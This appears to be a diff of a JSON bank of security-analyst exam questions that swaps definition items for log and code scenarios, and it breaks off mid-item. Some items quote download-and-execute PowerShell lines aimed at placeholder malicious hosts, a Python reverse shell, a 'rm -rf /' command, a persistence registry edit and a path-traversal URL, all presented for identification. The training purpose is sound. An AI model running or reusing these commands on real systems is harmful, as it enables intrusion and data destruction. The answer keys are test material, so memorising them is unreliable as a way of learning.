-        "Transferring the risk to a third party, such as an insurance company. ",
-        "Implementing controls to reduce the likelihood or impact of a risk. "
+        "DNS tunneling",
+        "Domain generation algorithm (DGA)",
+        "Command-and-control beaconing",
+        "Data obfuscation"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Risk acceptance isn't about ignoring risks. Transferring risk is a different strategy. Implementing controls is mitigation. Risk acceptance is a conscious decision. An organization understands a particular risk but decides, for business or cost reasons, not to take specific actions to reduce it. This should be a documented and justified decision.",
-      "examTip": "Risk acceptance should be a deliberate and informed decision, not simply ignoring risks."
+      "correctAnswerIndex": 0,
+      "explanation": "DNS tunneling uses DNS protocols (like TXT records) to covertly transfer data, often bypassing standard security controls.",
+      "examTip": "Monitor DNS traffic for unusual TXT records and frequent requests to suspicious domains."
     },
     {
       "id": 53,
-      "question": "Which of the following is a key component of a well-defined incident response plan?",
+      "question": "A penetration test report reveals that an internal application trusts serialized objects from user input without validation.\n\nWhich vulnerability does this represent?",
       "options": [
-        "A list of all known software vulnerabilities. ",
-        "Clearly defined roles, responsibilities, and procedures for handling security incidents.",
-        "A detailed inventory of all network devices. ",
-        "A guarantee of complete protection against all cyber threats. "
+        "Insecure deserialization",
+        "Cross-site request forgery (CSRF)",
+        "Broken authentication",
+        "Privilege escalation"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Vulnerability lists and device inventories are helpful, but not the core of a plan. No plan can guarantee complete protection. An incident response plan must define who does what during an incident, with clear steps and communication protocols. This ensures a coordinated and efficient response.",
-      "examTip": "A well-defined incident response plan is essential for minimizing the impact of security incidents."
+      "correctAnswerIndex": 0,
+      "explanation": "Insecure deserialization can allow attackers to execute arbitrary code by manipulating serialized objects.",
+      "examTip": "Use secure serialization methods and validate all user input during deserialization."
     },
     {
       "id": 54,
-      "question": "What is the purpose of 'data masking' or 'data obfuscation'?",
+      "question": "A security analyst detects a sudden increase in successful login attempts from various IP addresses, all using valid credentials, followed by suspicious outbound traffic.\n\nWhich attack technique is most likely being used?",
       "options": [
-        "To encrypt sensitive data. ",
-        "To replace sensitive data with non-sensitive substitutes, while maintaining its usability for testing or development.",
-        "To delete sensitive data permanently. ",
-        "To back up sensitive data to a secure location. "
+        "Credential stuffing",
+        "Brute force attack",
+        "Pass-the-hash attack",
+        "Lateral movement"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Data masking isn't encryption, deletion, or backup. Data masking (or obfuscation) replaces real sensitive data (like credit card numbers or PII) with realistic but fake data. This allows developers or testers to work with data that looks real, without exposing the actual sensitive information.",
-      "examTip": "Data masking protects sensitive data while preserving its utility for non-production purposes."
+      "correctAnswerIndex": 0,
+      "explanation": "Credential stuffing uses previously compromised credentials across multiple accounts and services.",
+      "examTip": "Monitor login patterns and implement MFA to mitigate credential stuffing risks."
     },
     {
       "id": 55,
-      "question": "You are analyzing network traffic and observe a large number of DNS requests for unusual or non-existent domain names. This could be an indicator of:",
+      "question": "Review the following log:\n\nFeb 23 16:35:17 server1 sudo: user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/usr/bin/python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\nWhat does this log entry indicate?",
       "options": [
-        "Normal network activity. ",
-        "A DNS server misconfiguration. ",
-        "Malware using Domain Generation Algorithms (DGAs) to communicate with a command-and-control server.",
-        "A user mistyping domain names. "
+        "Privilege escalation attempt via spawning a shell",
+        "Data exfiltration using Python scripts",
+        "Persistence establishment through cron jobs",
+        "Command injection in a web application"
       ],
-      "correctAnswerIndex": 2,
-      "explanation": "While misconfigurations or typos are possible, a large number of unusual requests is suspicious. Normal activity wouldn't involve many non-existent domains. DGAs are a common malware technique. Malware uses algorithms to generate many domain names, making it harder to block C2 communication by simply blocking a single domain.",
-      "examTip": "Unusual DNS request patterns can be a sign of malware using DGAs."
+      "correctAnswerIndex": 0,
+      "explanation": "The Python command spawns a bash shell with root privileges, indicating a potential privilege escalation attempt.",
+      "examTip": "Investigate shell spawning commands, especially when executed via sudo, for privilege abuse attempts."
     },
     {
       "id": 56,
-      "question": "Which of the following is the BEST description of a 'false negative' in security monitoring?",
+      "question": "A security engineer notices multiple internal endpoints attempting to reach 203.0.113.45 over TCP port 22. The organization does not use SSH for internal communication.\n\nWhich action should be taken FIRST?",
       "options": [
-        "A security system correctly identifies a threat. ",
-        "A security system incorrectly flags a legitimate activity as malicious. ",
-        "A security system fails to detect an actual security incident.",
-        "A security system generates an alert for a non-existent event. "
+        "Isolate the affected systems from the network",
+        "Conduct packet captures to analyze SSH traffic",
+        "Update firewall rules to block port 22",
+        "Notify stakeholders of a potential breach"
       ],
-      "correctAnswerIndex": 2,
-      "explanation": "Correct identification is a true positive. Incorrect flagging is a false positive. There's no alert for a non-existent event. A false negative is a missed detection. The security system should have generated an alert, but it didn't, meaning a real threat went unnoticed.",
-      "examTip": "False negatives are dangerous because they represent undetected security incidents."
+      "correctAnswerIndex": 0,
+      "explanation": "Unexpected SSH communication suggests lateral movement or malware activity; isolating affected systems prevents further compromise.",
+      "examTip": "Containment through isolation should always precede deeper analysis during active incidents."
     },
     {
       "id": 57,
-      "question": "Which of the following is an example of a 'compensating control'?",
+      "question": "A review of cloud configurations shows that an administrator role in the AWS environment lacks MFA and uses an API key stored in a public GitHub repository.\n\nWhich risk does this pose?",
       "options": [
-        "Implementing a firewall to block unauthorized network access. ",
-        "Implementing multi-factor authentication (MFA) when a required security patch cannot be immediately applied.",
-        "Regularly patching software vulnerabilities. ",
-        "Encrypting sensitive data at rest. "
+        "Credential exposure leading to full account compromise",
+        "Privilege escalation through IAM role chaining",
+        "Session hijacking using temporary access tokens",
+        "Resource exhaustion via crypto mining attacks"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Firewalls, patching, and encryption are standard controls, not compensating ones. A compensating control is used when a primary control cannot be implemented (or is not fully effective).  If a critical patch isn't available, MFA adds an extra layer of security to compensate for the unpatched vulnerability.",
-      "examTip": "Compensating controls provide alternative security measures when primary controls are not feasible or fully effective."
+      "correctAnswerIndex": 0,
+      "explanation": "Storing API keys publicly allows attackers to access cloud resources with admin privileges, potentially leading to total account compromise.",
+      "examTip": "Never store cloud access keys in public repositories; use environment variables and enable MFA."
     },
     {
       "id": 58,
-      "question": "What is the primary purpose of the 'eradication' phase in the incident response process?",
+      "question": "Analyze the following code snippet:\n\nimport os\nos.system(\"rm -rf / --no-preserve-root\")\n\nWhat is the primary risk associated with this code?",
       "options": [
-        "To contain the spread of an incident. ",
-        "To remove the root cause of the incident and eliminate the threat from the affected systems.",
-        "To restore systems to their normal operational state. ",
-        "To identify the initial point of compromise. "
+        "Destructive command leading to total system deletion",
+        "Privilege escalation using system-level commands",
+        "Data exfiltration through file system traversal",
+        "Command injection vulnerability"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Containment limits the spread. Restoration is recovery. Identifying the initial point is part of analysis. Eradication is about removal. It involves completely eliminating the malware, attacker access, or vulnerability that caused the incident. This might involve deleting files, patching systems, or resetting passwords.",
-      "examTip": "The eradication phase focuses on completely removing the threat from the environment."
+      "correctAnswerIndex": 0,
+      "explanation": "This command forcefully deletes all files on the system without preservation, representing a Denial of Service (DoS) scenario.",
+      "examTip": "Audit code for destructive commands, especially those affecting critical directories."
     },
     {
       "id": 59,
-      "question": "What is the function of the `strings` command in Linux?",
+      "question": "A suspicious email passes SPF and DKIM checks but contains a link to an unfamiliar domain. The email urges urgent action related to a financial transaction.\n\nWhich additional control could detect if this email is malicious?",
       "options": [
-        "To encrypt files. ",
-        "To extract printable characters from a file, which can be useful for analyzing malware.",
-        "To display network connections. ",
-        "To list running processes. "
+        "DMARC analysis for domain alignment",
+        "SPF record revalidation against sending servers",
+        "Firewall rules to block phishing URLs",
+        "User behavior analytics (UBA) on email interactions"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "`strings` doesn't encrypt, show network connections, or list processes. The `strings` command looks for sequences of printable characters within a file (often a binary executable).  This can reveal embedded text, URLs, or other clues about the file's purpose, which is very helpful in malware analysis.",
-      "examTip": "The `strings` command is a simple but powerful tool for quickly examining the contents of files, especially executables."
+      "correctAnswerIndex": 0,
+      "explanation": "While SPF and DKIM passed, DMARC enforces domain alignment, which helps detect phishing attempts that spoof legitimate domains.",
+      "examTip": "DMARC policies add an extra layer of protection by verifying sender legitimacy beyond SPF/DKIM."
     },
     {
       "id": 60,
-      "question": "Which CVSS metric considers the impact on the confidentiality of data if a vulnerability is exploited?",
+      "question": "An attacker exploits a web application by injecting malicious XML payloads that access internal files.\n\nWhich type of attack is being performed?",
       "options": [
-        "Attack Vector (AV). ",
-        "Confidentiality (C)",
-        "Integrity (I). ",
-        "Availability (A). "
+        "XML External Entity (XXE) attack",
+        "Server-side request forgery (SSRF)",
+        "Cross-site scripting (XSS)",
+        "Remote code execution (RCE)"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Attack Vector is how its accessed. Integrity measures if data can be modified, while availability is if a service can be disrupted. The Confidentiality (C) metric specifically assesses the impact on the secrecy of information if the vulnerability is successfully exploited. It has ratings like None, Low, or High.",
-      "examTip": "The CIA triad (Confidentiality, Integrity, Availability) are directly represented in the CVSS impact metrics."
+      "correctAnswerIndex": 0,
+      "explanation": "XXE attacks exploit XML parsers by referencing external entities to read internal files or execute commands.",
+      "examTip": "Disable DTD processing and use secure XML parsers to prevent XXE vulnerabilities."
     },
     {
       "id": 61,
-      "question": "What is a 'security baseline'?",
+      "question": "A security analyst observes unusual outbound HTTPS connections from a server to multiple IP addresses on port 443 at regular intervals. The traffic uses self-signed certificates not recognized by internal systems.\n\nWhat does this activity most likely indicate?",
       "options": [
-        "A list of all known vulnerabilities. ",
-        "A documented set of security configurations and settings that represent a secure state for a system or application.",
-        "The process of identifying and prioritizing risks. ",
-        "A type of firewall rule. "
+        "Command-and-control (C2) communication using encrypted channels",
+        "Legitimate system updates from vendor-managed servers",
+        "Man-in-the-middle (MITM) attack intercepting HTTPS traffic",
+        "Data exfiltration via DNS tunneling"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "It is not just a vulnerability list, risk assessment, or a firewall rule. A security baseline defines the expected secure configuration. It's a set of settings, hardening guidelines, and best practices that, when implemented, create a known-good, secure state for a system.  Deviations from the baseline can indicate a security issue.",
-      "examTip": "Security baselines provide a benchmark for measuring the security posture of systems."
+      "correctAnswerIndex": 0,
+      "explanation": "Regular outbound HTTPS traffic using unrecognized self-signed certificates suggests encrypted C2 communication to avoid detection.",
+      "examTip": "Monitor TLS traffic for unusual certificate authorities and unexpected external destinations."
     },
     {
       "id": 62,
-      "question": "What is the primary goal of 'vulnerability management'?",
+      "question": "A review of web server access logs shows the following entries:\n\n192.168.1.10 - - [23/Feb/2025:13:32:45 +0000] \"GET /api/user?role=admin HTTP/1.1\" 200 1024\n192.168.1.10 - - [23/Feb/2025:13:32:50 +0000] \"GET /api/user?role=superadmin HTTP/1.1\" 200 1056\n\nWhat vulnerability is most likely being exploited?",
       "options": [
-        "To prevent all cyberattacks. ",
-        "To identify, assess, prioritize, and remediate security vulnerabilities in a systematic way.",
-        "To encrypt all sensitive data. ",
-        "To conduct penetration testing. "
+        "Insecure Direct Object Reference (IDOR)",
+        "Broken access control",
+        "Cross-site scripting (XSS)",
+        "SQL injection"
       ],
       "correctAnswerIndex": 1,
-      "explanation": "No process can prevent all attacks. Encryption is a security control, not the goal of vulnerability management. Penetration testing is a related activity, but it's not the overall management process. Vulnerability management is a continuous cycle of identifying weaknesses, assessing their risk, prioritizing them based on severity and exploitability, and then taking steps to fix them (patching, configuration changes, etc.).",
-      "examTip": "Vulnerability management is a continuous process for reducing an organization's attack surface."
+      "explanation": "Manipulating user role parameters without proper authorization checks is a clear sign of broken access control.",
+      "examTip": "APIs must enforce proper access controls at every level to prevent privilege manipulation."
     },
     {
       "id": 63,
-      "question": "What is 'fuzzing'?",
+      "question": "A cloud storage bucket is discovered with sensitive customer data accessible via public URLs. The security policy states that only internal users should have access.\n\nWhich control would BEST prevent this exposure?",
       "options": [
-        "A technique used to encrypt data. ",
-        "A software testing technique that involves providing invalid, unexpected, or random data as input to a program to identify vulnerabilities.",
-        "A type of social engineering attack. ",
-        "A method for creating secure passwords. "
+        "Implement identity-based access policies on the bucket",
+        "Apply server-side encryption using customer-managed keys",
+        "Configure VPC endpoints for private access to storage",
+        "Enable detailed audit logging for all bucket operations"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Fuzzing isn't related to encryption, social engineering, or passwords. Fuzzing is a powerful testing method. It throws a lot of 'bad' data at a program (unexpected inputs, malformed data, etc.) to see if it crashes or behaves unexpectedly.  This can reveal vulnerabilities like buffer overflows or input validation errors.",
-      "examTip": "Fuzzing is an effective way to discover software vulnerabilities that might be missed by other testing methods."
+      "correctAnswerIndex": 0,
+      "explanation": "Applying identity-based access policies ensures that only authenticated, authorized users can access sensitive cloud storage resources.",
+      "examTip": "Public access to sensitive data in cloud environments should be disabled by default with strict identity controls."
     },
     {
       "id": 64,
-      "question": "What is an 'APT'?",
+      "question": "You detect the following PowerShell command in system logs:\n\npowershell.exe -nop -w hidden -c \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-server.com/revshell.ps1')\"\n\nWhat should be the immediate next step?",
       "options": [
-        "A type of firewall. ",
-        "Advanced Persistent Threat, a sophisticated, prolonged cyberattack typically carried out by nation-states or well-resourced groups.",
-        "A type of encryption algorithm. ",
-        "A method of securing a network perimeter. "
+        "Isolate the affected host from the network",
+        "Run antivirus scans to detect malware signatures",
+        "Analyze firewall logs for outbound C2 connections",
+        "Check user permissions for unauthorized privilege escalation"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "An APT is a type of attack not a security tool or method. APT (Advanced Persistent Threat) refers to highly sophisticated, long-term attacks.  These are often carried out by nation-states or organized crime groups, targeting specific organizations for espionage or data theft. They are characterized by stealth, persistence, and the use of advanced techniques.",
-      "examTip": "APTs represent a significant threat due to their sophistication, persistence, and resources."
+      "correctAnswerIndex": 0,
+      "explanation": "The command downloads and executes a remote shell script in memory—immediate host isolation is critical to contain the threat.",
+      "examTip": "For fileless malware, containment through isolation is the top priority before further analysis."
     },
     {
       "id": 65,
-      "question": "You are investigating a suspected malware infection. Which of the following is the MOST reliable way to determine if a file is malicious?",
+      "question": "An attacker exploits an API by sending a request that bypasses client-side validation and modifies the 'userId' parameter to access another user’s data.\n\nWhich vulnerability does this represent?",
       "options": [
-        "Checking the file size. ",
-        "Comparing the file's hash to a known-good hash.",
-        "Checking the file's creation date. ",
-        "Scanning the file with a single antivirus engine. "
+        "Insecure Direct Object Reference (IDOR)",
+        "Broken authentication",
+        "Cross-site request forgery (CSRF)",
+        "Command injection"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "File size and creation date can be easily manipulated. A single antivirus might miss a new or sophisticated threat. Comparing the file's hash (a unique fingerprint) to a database of known malicious hashes (like VirusTotal) is the most reliable. If the hash matches a known bad file, it's almost certainly malicious.",
-      "examTip": "Hash comparison is a powerful and reliable method for identifying known malware."
+      "correctAnswerIndex": 0,
+      "explanation": "IDOR occurs when an attacker can manipulate object references (such as 'userId') to access unauthorized data due to lack of proper server-side validation.",
+      "examTip": "Implement server-side validation for all object references to prevent IDOR vulnerabilities."
     },
     {
       "id": 66,
-      "question": "What is 'threat intelligence'?",
+      "question": "During a vulnerability assessment, a web server is found to be using outdated TLS 1.0 protocols. The organization handles payment transactions.\n\nWhich compliance standard would MOST LIKELY flag this as a critical issue?",
       "options": [
-        "The process of encrypting data. ",
-        "Information about known or emerging threats, including threat actors, their motivations, and their techniques.",
-        "A type of firewall rule. ",
-        "The process of creating secure passwords. "
+        "PCI DSS",
+        "ISO 27001",
+        "NIST 800-53",
+        "OWASP Top Ten"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Threat intelligence is information, not encryption, a firewall, or passwords. Threat intelligence is knowledge about threats. This can include information about specific malware families, attacker groups, vulnerabilities being exploited, and indicators of compromise. It helps organizations understand the threat landscape and make informed security decisions.",
-      "examTip": "Threat intelligence helps organizations proactively defend against known and emerging threats."
+      "correctAnswerIndex": 0,
+      "explanation": "PCI DSS requires strong encryption for payment data transmission; TLS 1.0 is considered insecure and non-compliant with PCI DSS standards.",
+      "examTip": "For payment-related environments, ensure encryption protocols meet PCI DSS standards (TLS 1.2+)."
     },
     {
       "id": 67,
-      "question": "Which of the following is the BEST description of 'OWASP'?",
+      "question": "An internal host is repeatedly resolving random domain names such as abcd1234.randomdomain.net and xyz5678.randomdomain.net without corresponding HTTP traffic.\n\nWhich behavior does this MOST LIKELY indicate?",
       "options": [
-        "A type of firewall. ",
-        "The Open Web Application Security Project, a non-profit organization focused on improving the security of software.",
-        "A type of encryption algorithm. ",
-        "A method of securing a network perimeter. "
+        "Domain Generation Algorithm (DGA) used for malware persistence",
+        "DNS poisoning attempts targeting internal name servers",
+        "Beaconing to a command-and-control (C2) server using DNS tunneling",
+        "Reconnaissance scanning for open DNS resolvers"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "OWASP is not a firewall, encryption algorithm or perimeter security method. OWASP (Open Web Application Security Project) is a well-respected community and resource for web application security. They provide tools, guidelines, and the OWASP Top 10 (a list of the most critical web application security risks).",
-      "examTip": "OWASP is a valuable resource for developers and security professionals working with web applications."
+      "correctAnswerIndex": 0,
+      "explanation": "The use of random domains without further connections suggests DGA behavior, where malware generates domains to locate active C2 servers.",
+      "examTip": "Look for frequent DNS queries to seemingly random domains as indicators of DGA-based malware."
     },
     {
       "id": 68,
-      "question": "Which of the following is a benefit of using a 'SIEM' system?",
+      "question": "A penetration tester successfully gains access to a Windows server and executes the following command:\n\nreg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v updater /t REG_SZ /d \"C:\\\\malware.exe\"\n\nWhat is the primary purpose of this action?",
       "options": [
-        "SIEMs eliminate the need for firewalls. ",
-        "SIEMs provide real-time security monitoring, log aggregation, and alerting.",
-        "SIEMs guarantee complete protection against all cyber threats. ",
-        "SIEMs are only useful for large enterprises. "
+        "Establish persistence by executing malware on startup",
+        "Escalate privileges through registry manipulation",
+        "Disable endpoint protection software",
+        "Exfiltrate data through registry key modifications"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "SIEMs enhance, not replace, other controls. They don't guarantee total protection, and they benefit organizations of various sizes. SIEMs are crucial for security monitoring. They collect logs from many sources, analyze them in real-time, and correlate events, providing a comprehensive view of security posture.",
-      "examTip": "SIEM systems are essential for centralized security monitoring and incident response."
+      "correctAnswerIndex": 0,
+      "explanation": "Adding entries to the 'Run' registry key ensures that malware runs automatically upon system startup, establishing persistence.",
+      "examTip": "Monitor critical registry paths for unauthorized modifications—common in persistence techniques."
     },
     {
       "id": 69,
-      "question": "What is 'data exfiltration'?",
+      "question": "A sandbox analysis reveals that a malware sample:\n- Creates scheduled tasks with SYSTEM privileges\n- Establishes outbound connections on port 8080\n- Disables Windows Defender services\n\nWhich type of malware behavior is being observed?",
       "options": [
-        "The process of backing up data. ",
-        "The unauthorized transfer of data from a system or network to an external location.",
-        "The process of encrypting data. ",
-        "The process of deleting data. "
+        "Trojan establishing persistence and C2 communication",
+        "Rootkit hiding malicious processes from detection",
+        "Ransomware preparing for file encryption",
+        "Worm attempting to spread across the network"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Data exfiltration is not a backup, encryption, or deletion. Data exfiltration is the theft of data. It's when an attacker copies data from a compromised system and sends it to a location they control. This is a major goal of many cyberattacks.",
-      "examTip": "Preventing data exfiltration is a critical security objective."
+      "correctAnswerIndex": 0,
+      "explanation": "The combination of persistence mechanisms (scheduled tasks), outbound C2 communication, and security service disablement aligns with Trojan behavior.",
+      "examTip": "Trojan indicators often include persistence techniques and efforts to disable defenses for prolonged access."
     },
     {
       "id": 70,
-      "question": "What is the purpose of 'patch management'?",
+      "question": "A network security tool generates an alert for abnormal SMB traffic between internal hosts, followed by large file transfers to a single host.\n\nWhich attack phase is MOST LIKELY occurring?",
       "options": [
-        "To encrypt data. ",
-        "To apply software updates (patches) to fix security vulnerabilities and improve system stability.",
-        "To conduct penetration testing. ",
-        "To manage user accounts and passwords. "
+        "Lateral movement",
+        "Initial access",
+        "Exfiltration",
+        "Reconnaissance"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Patch management is not about encrypting data, penetration testing or managing user accounts. Patch management is the process of applying updates. Software vendors release patches to fix security vulnerabilities and bugs.  A robust patch management process ensures these patches are applied promptly and consistently, reducing the risk of exploitation.",
-      "examTip": "Regular and timely patching is crucial for maintaining system security."
+      "correctAnswerIndex": 0,
+      "explanation": "Abnormal SMB traffic and internal file transfers are indicative of lateral movement, where attackers move between systems within the network.",
+      "examTip": "Monitor internal SMB traffic patterns—unusual transfers may signal lateral movement attempts."
     },
     {
       "id": 71,
-      "question": "Which of the following is an example of an 'insider threat'?",
+      "question": "A security analyst discovers that attackers are intercepting HTTP traffic and injecting malicious JavaScript into web pages served to users.\n\nWhich type of attack is being conducted?",
       "options": [
-        "An external attacker attempting to breach a network perimeter. ",
-        "A disgruntled employee intentionally leaking sensitive data.",
-        "A malware infection spreading through email attachments. ",
-        "A denial-of-service (DoS) attack. "
+        "Man-in-the-middle (MITM) attack",
+        "Cross-site scripting (XSS)",
+        "Session hijacking",
+        "DNS poisoning"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "External attackers, malware, and DoS attacks are external threats. An insider threat comes from within the organization. This could be a current or former employee, contractor, or anyone with authorized access who misuses that access (intentionally or unintentionally) to harm the organization.",
-      "examTip": "Insider threats can be difficult to detect and can cause significant damage."
+      "correctAnswerIndex": 0,
+      "explanation": "Intercepting and modifying HTTP traffic before it reaches the user is characteristic of a MITM attack.",
+      "examTip": "Use HTTPS with valid certificates to prevent MITM attacks on web traffic."
     },
     {
       "id": 72,
-      "question": "Which of the following is the BEST way to protect against cross-site scripting (XSS) attacks?",
+      "question": "During a review of user behavior analytics, multiple failed login attempts from diverse geographic locations for a single user account are detected within a short period.\n\nWhich attack method is most likely being attempted?",
       "options": [
-        "Using strong passwords. ",
-        "Implementing input validation and output encoding.",
-        "Encrypting all network traffic. ",
-        "Conducting regular vulnerability scans. "
+        "Credential stuffing",
+        "Brute force attack",
+        "Phishing",
+        "Man-in-the-middle attack"
       ],
       "correctAnswerIndex": 1,
-      "explanation": "Strong passwords and encryption don't directly prevent XSS. Vulnerability scans identify the vulnerability, but don't prevent the attack. Input validation (checking user input for malicious code) and output encoding (converting special characters into a safe format) are the core defenses against XSS. They prevent injected scripts from being executed by the browser.",
-      "examTip": "Input validation and output encoding are essential for preventing XSS attacks."
+      "explanation": "Multiple rapid login attempts typically indicate a brute force attack where attackers try many passwords to gain access.",
+      "examTip": "Implement account lockout policies and MFA to reduce the risk of brute force attacks."
     },
     {
       "id": 73,
-      "question": "What is 'SOAR' in cybersecurity?",
+      "question": "A penetration tester discovers that a web application fails to validate user input and directly executes OS-level commands based on user-supplied data.\n\nWhich vulnerability is present?",
       "options": [
-        "A type of firewall. ",
-        "Security Orchestration, Automation, and Response, a platform that automates security tasks and integrates security tools.",
-        "A type of encryption algorithm. ",
-        "A method of conducting a pen test. "
+        "Command injection",
+        "SQL injection",
+        "Cross-site request forgery (CSRF)",
+        "Insecure deserialization"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "SOAR is not a firewall, encryption method, or a type of penetration test. SOAR (Security Orchestration, Automation, and Response) platforms help automate security tasks. They integrate various security tools (SIEM, threat intelligence feeds, etc.) and allow for automated responses to certain types of incidents, improving efficiency and reducing response times.",
-      "examTip": "SOAR helps security teams automate and streamline their workflows."
+      "correctAnswerIndex": 0,
+      "explanation": "Command injection occurs when user input is directly passed to a system shell without proper validation, allowing arbitrary OS command execution.",
+      "examTip": "Always sanitize and validate user inputs, especially when passing them to system commands."
     },
     {
       "id": 74,
-      "question": "What does 'DLP' stand for?",
+      "question": "The following Python code is discovered on a compromised server:\n\nimport socket\ns = socket.socket()\ns.connect(('203.0.113.25', 5555))\nwhile True:\n    command = s.recv(1024)\n    if command:\n        output = os.popen(command.decode()).read()\n        s.send(output.encode())\n\nWhat malicious function does this code perform?",
       "options": [
-        "Data Loss Prevention",
-        "Distributed L அணுகல் Protocol. ",
-        "Digital Logging Process. ",
-        "Data Link Protection. "
+        "Reverse shell for remote command execution",
+        "Keylogger capturing user input",
+        "Ransomware encrypting user files",
+        "Botnet client participating in DDoS attacks"
       ],
       "correctAnswerIndex": 0,
-      "explanation": "DLP stands for Data Loss Prevention, technologies used to classify, monitor, and protect confidential data.",
-      "examTip": "DLP systems help prevent sensitive data from leaving the organization's control."
+      "explanation": "The code creates a reverse shell that connects to an attacker-controlled server and executes received commands remotely.",
+      "examTip": "Detect reverse shells by monitoring unusual outbound connections and unexpected listening ports."
     },
     {
       "id": 75,
-      "question": "A security analyst is reviewing logs and notices a large number of requests to a specific URL on a web server, followed by an error message indicating a successful SQL injection. What should the analyst do FIRST?",
+      "question": "An attacker exploits a web application using the following URL:\n\nhttp://example.com/view.php?file=../../../../etc/passwd\n\nWhich vulnerability is being exploited?",
       "options": [
-        "Immediately shut down the web server. ",
-        "Isolate the web server from the network.",
-        "Review the web application code to identify the vulnerability. ",
-        "Attempt to replicate the SQL injection attack to confirm it. "
+        "Directory traversal",
+        "Remote file inclusion (RFI)",
+        "Cross-site scripting (XSS)",
+        "SQL injection"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Shutting down the server disrupts service unnecessarily before containment. Reviewing code and replicating are important later steps. The first priority is to contain the incident. Isolating the web server prevents the attacker from potentially causing further damage or accessing other systems on the network.",
-      "examTip": "Containment is a crucial first step in incident response to limit the impact of a breach."
+      "correctAnswerIndex": 0,
+      "explanation": "The `../` sequence in the URL attempts to access restricted files, indicating a directory traversal vulnerability.",
+      "examTip": "Prevent directory traversal by sanitizing user input and restricting file path access."
     },
     {
       "id": 76,
-      "question": "Which attack involves exploiting a vulnerability to overwrite portions of a system's memory?",
+      "question": "During incident response, you detect that malware was distributed via a legitimate website by injecting malicious JavaScript code that runs in users' browsers.\n\nWhat type of attack does this represent?",
       "options": [
-        "Cross-Site Scripting (XSS). ",
-        "Buffer Overflow",
-        "SQL Injection. ",
-        "Phishing. "
+        "Cross-site scripting (XSS)",
+        "SQL injection",
+        "Command injection",
+        "Man-in-the-middle (MITM)"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "XSS targets web applications.  SQL injection targets databases. Phishing is social engineering. A buffer overflow occurs when a program tries to write data beyond the allocated memory buffer. This can overwrite adjacent memory areas, potentially allowing an attacker to inject and execute malicious code.",
-      "examTip": "Buffer overflows are a classic type of software vulnerability that can lead to code execution."
+      "correctAnswerIndex": 0,
+      "explanation": "XSS allows attackers to inject malicious scripts into web pages viewed by other users, running in their browsers.",
+      "examTip": "Use input validation, output encoding, and CSP headers to defend against XSS attacks."
     },
     {
       "id": 77,
-      "question": "Which of the following is an example of PII?",
+      "question": "A SIEM system detects multiple DNS requests from a single host to domains such as a1b2c3d4.example.com, e5f6g7h8.example.com, without corresponding HTTP traffic.\n\nWhat should be the next step for the analyst?",
       "options": [
-        "A server's IP address. ",
-        "A user's social security number.",
-        "A company's public website URL. ",
-        "The operating system version of a server. "
+        "Investigate for Domain Generation Algorithm (DGA) malware",
+        "Block the external domain at the firewall level",
+        "Check for DNS poisoning attempts in the network",
+        "Notify management of a potential phishing campaign"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "IP addresses, URLs, and OS versions are not directly identifying an individual. PII (Personally Identifiable Information) is any data that can be used to identify a specific person.  A social security number is a prime example of PII.",
-      "examTip": "Protecting PII is crucial for privacy and compliance with regulations like GDPR and CCPA."
+      "correctAnswerIndex": 0,
+      "explanation": "The pattern suggests DGA-based malware, which uses algorithmically generated domains to communicate with C2 servers.",
+      "examTip": "Monitor DNS logs for unusual query patterns and domains with randomized strings to detect DGA activity."
     },
     {
       "id": 78,
-      "question": "What is the primary function of a 'WAF'?",
+      "question": "A recent compromise involved an attacker escalating privileges by exploiting a vulnerable SUID binary on a Linux server.\n\nWhich action would BEST prevent such attacks in the future?",
       "options": [
-        "To encrypt network traffic. ",
-        "To filter and block malicious traffic targeting web applications.",
-        "To provide secure remote access to a network. ",
-        "To manage user accounts and passwords. "
+        "Regularly audit SUID/SGID permissions on critical systems",
+        "Implement file integrity monitoring (FIM) solutions",
+        "Apply kernel patches and disable unused services",
+        "Enforce mandatory access controls (MAC) using SELinux"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "A WAF is not for encryption, remote access, or user management. A WAF (Web Application Firewall) sits in front of web servers and inspects incoming traffic. It blocks requests that exhibit malicious patterns, such as SQL injection, XSS, or other web-based attacks.",
-      "examTip": "A WAF is a crucial security control for protecting web applications from attacks."
+      "correctAnswerIndex": 0,
+      "explanation": "Auditing SUID binaries helps detect and remove unnecessary privileges that attackers could exploit for escalation.",
+      "examTip": "Minimize SUID binaries and ensure proper permissions to reduce privilege escalation vectors."
     },
     {
       "id": 79,
-      "question": "Which of the following describes the 'recovery' phase of the incident response process?",
+      "question": "During a threat hunt, the following PowerShell command is detected:\n\npowershell -ep bypass -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://malicious-ip.com/shell.ps1')\"\n\nWhich MITRE ATT&CK tactic does this align with?",
       "options": [
-        "Identifying the initial point of compromise. ",
-        "Containing the spread of an incident. ",
-        "Restoring systems to their normal operational state after an incident.",
-        "Removing the root cause of the incident. "
+        "Execution",
+        "Persistence",
+        "Credential Access",
+        "Lateral Movement"
       ],
-      "correctAnswerIndex": 2,
-      "explanation": "Identifying the compromise point is part of analysis. Containment limits the spread.  Removing the root cause is eradication. Recovery is about restoration. This involves bringing systems back online, restoring data from backups, and verifying that everything is working correctly after an incident.",
